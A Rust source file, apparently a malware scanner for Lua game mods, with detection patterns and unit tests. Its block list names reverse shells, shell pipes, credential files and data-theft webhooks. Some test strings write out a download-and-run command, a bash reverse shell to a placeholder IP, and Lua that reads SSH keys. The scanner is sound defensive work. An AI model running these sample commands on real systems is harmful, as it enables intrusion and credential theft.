        if text.starts_with(b"\x1bLJ") || text.starts_with(b"\x1bLua") {
            self.context.payload = true;
            self.danger(
                Category::DynamicCode,
                line,
                "embeds precompiled Lua bytecode",
            );
            return;
        }
        if let Some(kind) = executable_magic(text) {
            self.context.payload = true;
            self.danger(
                Category::Executable,
                line,
                &format!("embeds a {kind} inside a string"),
            );
            return;
        }
        if escapes >= 256 || (text.len() >= 64 && binary_ratio(text) > 0.3) {
            self.context.payload = true;
            self.warning(
                Category::BinaryBlob,
                line,
                "hides binary data inside a string",
            );
        }
        if let Ok(text) = std::str::from_utf8(text) {
            if long_encoded_run(text) {
                self.context.payload = true;
                self.warning(
                    Category::Obfuscation,
                    line,
                    "contains a long encoded payload (base64 or hex)",
                );
            }
            let report = &mut *self.report;
            command_patterns(self.file, line, text, report, &mut self.context);
            native_declarations(self.file, line, text, report);
        }
    }

    fn danger(&mut self, category: Category, line: u32, message: &str) {
        self.report.push(
            Severity::Danger,
            category,
            self.file,
            line,
            message.to_owned(),
        );
    }
    fn warning(&mut self, category: Category, line: u32, message: &str) {
        self.report.push(
            Severity::Warning,
            category,
            self.file,
            line,
            message.to_owned(),
        );
    }
    fn info(&mut self, category: Category, line: u32, message: &str) {
        self.report.push(
            Severity::Info,
            category,
            self.file,
            line,
            message.to_owned(),
        );
    }
}

/// Library members that only exist to reach outside a sandbox.
const SYSTEM_FUNCTIONS: &[&str] = &[
    "execute",
    "popen",
    "loadlib",
    "getenv",
    "tmpname",
    "sethook",
    "getregistry",
    "setupvalue",
    "upvaluejoin",
    "cdef",
    "dofile",
    "loadfile",
];

fn is_system_name(name: &str) -> bool {
    matches!(
        name,
        "os" | "io"
            | "ffi"
            | "debug"
            | "package"
            | "require"
            | "load"
            | "loadstring"
            | "loadfile"
            | "dofile"
            | "getfenv"
            | "setfenv"
    )
}

fn continues_expression(tok: &Tok) -> bool {
    matches!(
        tok,
        Tok::Op("=")
            | Tok::Op(",")
            | Tok::Op("(")
            | Tok::Op("{")
            | Tok::Op("[")
            | Tok::Op("..")
            | Tok::Op("+")
            | Tok::Op("-")
            | Tok::Op("*")
            | Tok::Op("/")
            | Tok::Op("%")
            | Tok::Op("^")
            | Tok::Op("<")
            | Tok::Op(">")
            | Tok::Op("<=")
            | Tok::Op(">=")
            | Tok::Op("==")
            | Tok::Op("~=")
            | Tok::Op(".")
            | Tok::Op(":")
            | Tok::Keyword("and")
            | Tok::Keyword("or")
            | Tok::Keyword("not")
            | Tok::Keyword("function")
    )
}

fn continuation_start(tok: &Tok) -> bool {
    matches!(
        tok,
        Tok::Op("..")
            | Tok::Op("+")
            | Tok::Op("*")
            | Tok::Op("/")
            | Tok::Op("%")
            | Tok::Op("^")
            | Tok::Op("==")
            | Tok::Op("~=")
            | Tok::Op(".")
            | Tok::Op(":")
            | Tok::Op(")")
            | Tok::Op("]")
            | Tok::Op("}")
            | Tok::Keyword("and")
            | Tok::Keyword("or")
    )
}

fn binary_ratio(text: &[u8]) -> f32 {
    let odd = text
        .iter()
        .filter(|&&b| b < 0x09 || (0x0e..0x20).contains(&b) || b == 0x7f)
        .count();
    odd as f32 / text.len().max(1) as f32
}

fn long_encoded_run(text: &str) -> bool {
    let mut base64 = 0;
    let mut hex = 0;
    for c in text.chars() {
        if c.is_ascii_hexdigit() {
            hex += 1;
        } else {
            if hex >= 512 {
                return true;
            }
            hex = 0;
        }
        if c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=' | '-' | '_') {
            base64 += 1;
        } else {
            if base64 >= 768 {
                return true;
            }
            base64 = 0;
        }
    }
    hex >= 512 || base64 >= 768
}

fn scan_text_payloads(file: &str, text: &str, report: &mut ScanReport) {
    if long_encoded_run(text) {
        report.push(
            Severity::Warning,
            Category::Obfuscation,
            file,
            0,
            "contains a long encoded payload (base64 or hex)".into(),
        );
    }
}

/// Shell and scripting commands, chosen to be specific: each pattern is
/// something a game mod's text has no ordinary reason to contain.
const COMMANDS: &[(&str, &str, Category)] = &[
    // Windows
    (
        "cmd.exe",
        "a Windows command prompt",
        Category::SystemCommand,
    ),
    (
        "cmd /c",
        "a Windows command prompt",
        Category::SystemCommand,
    ),
    (
        "cmd /k",
        "a Windows command prompt",
        Category::SystemCommand,
    ),
    (
        "powershell -",
        "a PowerShell command",
        Category::SystemCommand,
    ),
    (
        "powershell.exe",
        "a PowerShell command",
        Category::SystemCommand,
    ),
    ("pwsh -", "a PowerShell command", Category::SystemCommand),
    (
        "-encodedcommand",
        "an encoded PowerShell command",
        Category::SystemCommand,
    ),
    (
        "invoke-expression",
        "PowerShell code execution",
        Category::SystemCommand,
    ),
    (
        "invoke-webrequest",
        "a PowerShell download",
        Category::Network,
    ),
    (
        "downloadstring(",
        "a PowerShell download",
        Category::Network,
    ),
    ("downloadfile(", "a PowerShell download", Category::Network),
    (
        "start-process",
        "a PowerShell process launch",
        Category::SystemCommand,
    ),
    ("rundll32", "Windows DLL execution", Category::SystemCommand),
    (
        "regsvr32",
        "Windows DLL registration",
        Category::SystemCommand,
    ),
    (
        "mshta",
        "the Windows HTML application host",
        Category::SystemCommand,
    ),
    (
        "certutil -urlcache",
        "a Windows download utility",
        Category::Network,
    ),
    (
        "bitsadmin /transfer",
        "a Windows download utility",
        Category::Network,
    ),
    (
        "schtasks /create",
        "a Windows scheduled task",
        Category::SystemCommand,
    ),
    (
        "reg add ",
        "a Windows registry change",
        Category::SystemCommand,
    ),
    (
        "reg delete ",
        "a Windows registry change",
        Category::SystemCommand,
    ),
    (
        "vssadmin delete",
        "Windows backup deletion",
        Category::FileSystem,
    ),
    (
        "wmic process call create",
        "a Windows process launch",
        Category::SystemCommand,
    ),
    (
        "\\currentversion\\run",
        "a Windows startup entry",
        Category::SystemCommand,
    ),
    (
        "%appdata%",
        "the Windows user data folder",
        Category::FileSystem,
    ),
    (
        "\\appdata\\roaming",
        "the Windows user data folder",
        Category::FileSystem,
    ),
    // macOS
    (
        "osascript",
        "an AppleScript command",
        Category::SystemCommand,
    ),
    (
        "launchctl ",
        "a macOS launch service command",
        Category::SystemCommand,
    ),
    (
        "/library/launchagents",
        "a macOS startup agent",
        Category::SystemCommand,
    ),
    (
        "com.apple.quarantine",
        "macOS download quarantine removal",
        Category::SystemCommand,
    ),
    (
        "security find-generic-password",
        "macOS keychain access",
        Category::FileSystem,
    ),
    // Linux and Unix
    ("/bin/sh", "a Unix shell", Category::SystemCommand),
    ("/bin/bash", "a Unix shell", Category::SystemCommand),
    ("/bin/zsh", "a Unix shell", Category::SystemCommand),
    (
        "/usr/bin/env ",
        "a Unix interpreter launch",
        Category::SystemCommand,
    ),
    ("bash -c", "a Unix shell", Category::SystemCommand),
    ("sh -c ", "a Unix shell", Category::SystemCommand),
    ("zsh -c", "a Unix shell", Category::SystemCommand),
    ("rm -rf", "recursive file deletion", Category::FileSystem),
    ("rm -fr", "recursive file deletion", Category::FileSystem),
    (
        "chmod +x",
        "a command that makes files executable",
        Category::SystemCommand,
    ),
    (
        "chmod 777",
        "a file permission change",
        Category::FileSystem,
    ),
    ("| sh", "a pipe into a shell", Category::SystemCommand),
    ("| bash", "a pipe into a shell", Category::SystemCommand),
    ("|sh", "a pipe into a shell", Category::SystemCommand),
    ("|bash", "a pipe into a shell", Category::SystemCommand),
    ("nc -e", "a reverse shell", Category::Network),
    ("/dev/tcp/", "a reverse shell", Category::Network),
    ("mkfifo", "a named shell pipe", Category::SystemCommand),
    ("crontab ", "a scheduled command", Category::SystemCommand),
    (
        "systemctl ",
        "a system service change",
        Category::SystemCommand,
    ),
    (
        "/etc/passwd",
        "the system account file",
        Category::FileSystem,
    ),
    (
        "/etc/shadow",
        "the system password file",
        Category::FileSystem,
    ),
    ("~/.ssh", "an SSH key path", Category::FileSystem),
    ("/.ssh/", "an SSH key path", Category::FileSystem),
    ("base64 -d", "payload decoding", Category::Obfuscation),
    ("base64 --decode", "payload decoding", Category::Obfuscation),
    ("sudo ", "an administrator command", Category::SystemCommand),
    ("ld_preload", "library injection", Category::NativeCode),
    (
        "dyld_insert_libraries",
        "library injection",
        Category::NativeCode,
    ),
    // Data theft
    (
        "discord.com/api/webhooks",
        "a chat webhook often used for data theft",
        Category::Network,
    ),
    (
        "discordapp.com/api/webhooks",
        "a chat webhook often used for data theft",
        Category::Network,
    ),
    (
        "api.telegram.org/bot",
        "a chat bot API often used for data theft",
        Category::Network,
    ),
    (
        "pastebin.com/raw",
        "a paste site download",
        Category::Network,
    ),
];

fn command_patterns(
    file: &str,
    line: u32,
    text: &str,
    report: &mut ScanReport,
    context: &mut Context,
) {
    let lower = text.to_ascii_lowercase();
    for (pattern, what, category) in COMMANDS {
        if lower.contains(pattern) {
            context.os_exec |= *category == Category::SystemCommand;
            report.push(
                Severity::Warning,
                *category,
                file,
                line,
                format!("contains {what} (\"{}\")", pattern.trim()),
            );
        }
    }
    for scheme in ["curl ", "wget "] {
        if let Some(at) = lower.find(scheme)
            && lower[at..].contains("http")
        {
            report.push(
                Severity::Warning,
                Category::Network,
                file,
                line,
                format!("contains a download command (\"{}\")", scheme.trim()),
            );
        }
    }
    if (lower.contains("http://") || lower.contains("https://"))
        && [
            ".exe", ".dll", ".scr", ".ps1", ".bat", ".sh", ".dylib", ".so",
        ]
        .iter()
        .any(|ext| {
            lower
                .split(|c: char| c.is_whitespace() || c == '"' || c == '\'')
                .any(|word| word.starts_with("http") && word.ends_with(ext))
        })
    {
        report.push(
            Severity::Warning,
            Category::Network,
            file,
            line,
            "links to a downloadable program".into(),
        );
    }
}

/// C declarations of process, loader and memory APIs, as passed to ffi.cdef.
fn native_declarations(file: &str, line: u32, text: &str, report: &mut ScanReport) {
    let declaration = text.contains('(')
        && text.contains(';')
        && [
            "int ", "void", "char", "const ", "long ", "size_t", "DWORD", "HANDLE", "BOOL",
        ]
        .iter()
        .any(|t| text.contains(t));
    if !declaration {
        return;
    }
    const APIS: &[&str] = &[
        "system",
        "popen",
        "execv",
        "execve",
        "execvp",
        "execl",
        "fork",
        "posix_spawn",
        "dlopen",
        "dlsym",
        "mprotect",
        "mmap",
        "ptrace",
        "CreateProcessA",
        "CreateProcessW",
        "ShellExecuteA",
        "ShellExecuteW",
        "ShellExecuteExA",
        "ShellExecuteExW",
        "WinExec",
        "LoadLibraryA",
        "LoadLibraryW",
        "LoadLibraryExA",
        "LoadLibraryExW",
        "GetProcAddress",
        "VirtualAlloc",
        "VirtualAllocEx",
        "VirtualProtect",
        "WriteProcessMemory",
        "CreateRemoteThread",
        "URLDownloadToFileA",
        "URLDownloadToFileW",
        "InternetOpenA",
        "InternetOpenW",
        "socket",
        "connect",
    ];
    for api in APIS {
        let mut search = text;
        while let Some(at) = search.find(api) {
            let before = search[..at].chars().next_back();
            let after = search[at + api.len()..].trim_start().chars().next();
            let word_start = before.is_none_or(|c| !(c.is_ascii_alphanumeric() || c == '_'));
            if word_start && after == Some('(') {
                report.push(
                    Severity::Danger,
                    Category::NativeCode,
                    file,
                    line,
                    format!("declares the native function {api}()"),
                );
                break;
            }
            search = &search[at + api.len()..];
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn verdict(source: &str) -> (Verdict, ScanReport) {
        let report = scan_lua_source("main.lua", source.as_bytes());
        (report.verdict(), report)
    }

    #[test]
    fn ordinary_mods_and_tricky_but_harmless_code_are_clean() {
        let benign = [
            // Locals and parameters that share library names.
            "local os = { name = 'arena' }\nprint(os.name)",
            "local function io(x) return x end\nio(3)",
            "local function f(os, io) return os.execute, io.open end",
            "for os, io in pairs({}) do print(os, io) end",
            "for io = 1, 3 do print(io) end",
            // Fields, method calls and table keys.
            "local player = {}\nplayer.os = 1\nplayer:io()\nlocal t = { os = 1, io = 2, debug = false }",
            "local t = { [\"os\"] = true }\nprint(t.os)",
            // Comments and text never count.
            "-- os.execute('rm -rf /') would be bad\nprint('ok')",
            "--[[ io.popen('curl http://x | sh') ]] print(1)",
            "--[==[ nested ]] os.execute ]==] print(2)",
            "print('Choose your OS and IO settings in the menu.')",
            "tankyard.announce('The system will restart the round soon.')",
            "local about = [[Visit https://github.com/example/mod for help.]]",
            // Common idioms.
            "local ok, err = xpcall(function() end, debug.traceback)",
            "local start = os.time()",
            "local data = { 1, 2, 3, 4, 5 }\nreturn data",
            "tankyard.on('kill', function(e) tankyard.heal(e.actor, 15) end)",
            "local t = setmetatable({}, { __index = function(_, k) return k end })",
            "local s = ('x'):rep(10) .. string.format('%d', 5)",
            "goto continue\n::continue::",
            "local s = 'fork your own copy of this mod; it uses no system calls'",
            "local cdef_like = 'int main(void); is how C starts, but this is just text without ffi'",
        ];
        for source in benign {
            let (verdict, report) = verdict(source);
            assert_eq!(verdict, Verdict::Clean, "{source}\n{:?}", report.findings);
        }
    }

    #[test]
    fn local_declarations_take_effect_after_their_expression() {
        // `local os = os` still captures the real global on the right side.
        let (verdict, report) = verdict("local os = os\nos.execute('x')");
        assert_eq!(verdict, Verdict::Review, "{:?}", report.findings);
        let (verdict, _) = verdict_after("local config = {\n  os = 1,\n}\nprint(config.os)");
        assert_eq!(verdict, Verdict::Clean);
    }

    fn verdict_after(source: &str) -> (Verdict, ScanReport) {
        verdict(source)
    }

    #[test]
    fn system_execution_is_dangerous_on_every_platform() {
        let dangerous = [
            "os.execute('shutdown -h now')",
            "os.execute(\"cmd.exe /c del C:\\\\*\")",
            "local handle = io.popen('ls -la')",
            "io.open('/etc/passwd'):read('*a')",
            "local f = io.open(os.getenv('HOME') .. '/.ssh/id_rsa')",
            "os.remove('save.dat')",
            "os.exit(1)",
            "local ffi = require('ffi')\nffi.cdef[[int system(const char *cmd);]]\nffi.C.system('id')",
            "local ffi = require 'ffi'\nffi.cdef[[void* LoadLibraryA(const char*); int WinExec(const char*, int);]]",
            "local C = ffi.load('libc.so.6')",
            "package.loadlib('evil.dll', 'luaopen_evil')()",
            "dofile('/tmp/payload.lua')",
            "loadfile('C:/Users/Public/x.lua')()",
            "debug.sethook(function() end, 'c')",
            "local reg = debug.getregistry()",
            "local s = require('socket')",
            "_G.os.execute('whoami')",
            "_G['io'].popen('id')",
            "rawget(_G, 'os').execute('id')",
        ];
        for source in dangerous {
            let (verdict, report) = verdict(source);
            assert_eq!(
                verdict,
                Verdict::Dangerous,
                "{source}\n{:?}",
                report.findings
            );
        }
    }

    #[test]
    fn hidden_payloads_and_platform_commands_need_review() {
        let suspicious = [
            "local cmd = 'powershell -nop -w hidden -c iex(1)'",
            "local cmd = 'curl -s http://198.51.100.7/x.sh | bash'",
            "local cmd = 'osascript -e \"do shell script\"'",
            "local cmd = 'bash -c \"sh -i >& /dev/tcp/198.51.100.7/4444 0>&1\"'",
            "local key = 'schtasks /create /sc onlogon /tr evil'",
            "local url = 'https://discord.com/api/webhooks/123/abc'",
            "local code = loadstring('return 1')",
        ];
        for source in suspicious {
            let (verdict, report) = verdict(source);
            assert!(verdict != Verdict::Clean, "{source}\n{:?}", report.findings);
        }
        let payload = format!("local blob = '{}'", "QUFB".repeat(300));
        assert_eq!(verdict(&payload).0, Verdict::Review);
        let loader = format!(
            "local s = string.char({})\nload(s)()",
            (0..40)
                .map(|n| (65 + n % 26).to_string())
                .collect::<Vec<_>>()
                .join(",")
        );
        assert_eq!(verdict(&loader).0, Verdict::Dangerous);
        let bytes = format!(
            "local t = {{{}}}",
            (0..1500)
                .map(|n| (n % 256).to_string())
                .collect::<Vec<_>>()
                .join(",")
        );
        assert_eq!(verdict(&bytes).0, Verdict::Review);
        let escaped = format!("local s = \"{}\"", "\\x90".repeat(300));
        assert_eq!(verdict(&escaped).0, Verdict::Review);
        assert_eq!(verdict("local s = '\\27LJ\\2'").0, Verdict::Dangerous);
    }

    #[test]
    fn files_are_identified_by_content_not_just_by_name() {
        let pack = PackFiles::from_files([
            ("mod.json".to_owned(), br#"{"api_version":2}"#.to_vec()),
            ("main.lua".to_owned(), b"print('hi')".to_vec()),
            (
                "assets/skin.png".to_owned(),
                b"\x89PNG\r\n\x1a\n....".to_vec(),
            ),
            ("README.md".to_owned(), b"# Hello".to_vec()),
        ])
        .unwrap();
        assert_eq!(scan_pack(&pack).verdict(), Verdict::Clean);
        let cases: [(&str, &[u8], Verdict); 9] = [
            ("tools/run.exe", b"MZ\x90\x00", Verdict::Dangerous),
            ("skin.png", b"\x7fELF\x02\x01\x01", Verdict::Dangerous),
            (
                "data.bin",
                &[0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1],
                Verdict::Dangerous,
            ),
            ("install.sh", b"#!/bin/sh\necho hi", Verdict::Dangerous),
            ("run.bat", b"@echo off", Verdict::Dangerous),
            ("inner.zip", b"PK\x03\x04rest", Verdict::Review),
            (
                "blob.dat",
                &[0x00, 0xff, 0x13, 0x88, 0x00, 0x91],
                Verdict::Review,
            ),
            ("fake.png", b"GIF89a", Verdict::Review),
            ("compiled.lua", b"\x1bLJ\x02\x00", Verdict::Dangerous),
        ];
        for (name, data, expected) in cases {
            let pack = PackFiles::from_files([
                ("mod.json".to_owned(), b"{}".to_vec()),
                (name.to_owned(), data.to_vec()),
            ])
            .unwrap();
            assert_eq!(scan_pack(&pack).verdict(), expected, "{name}");
        }
    }

    #[test]
    fn local_modules_resolve_and_garbage_never_panics() {
        let pack = PackFiles::from_files([
            (
                "main.lua".to_owned(),
                b"local util = require('lib.util')".to_vec(),
            ),
            ("lib/util.lua".to_owned(), b"return {}".to_vec()),
        ])
        .unwrap();
        assert_eq!(scan_pack(&pack).verdict(), Verdict::Clean);
        let mut seed = 0x1234_5678_u64;
        for _ in 0..300 {
            let length = (seed % 400) as usize;
            let bytes: Vec<u8> = (0..length)
                .map(|_| {
                    seed ^= seed << 13;
                    seed ^= seed >> 7;
                    seed ^= seed << 17;
                    b"local os io=()[]{}'\"\\-\n.:;,x0123[[]]==ffi"[(seed % 41) as usize]
                })
                .collect();
            let _ = scan_lua_source("fuzz.lua", &bytes);
        }
    }
}
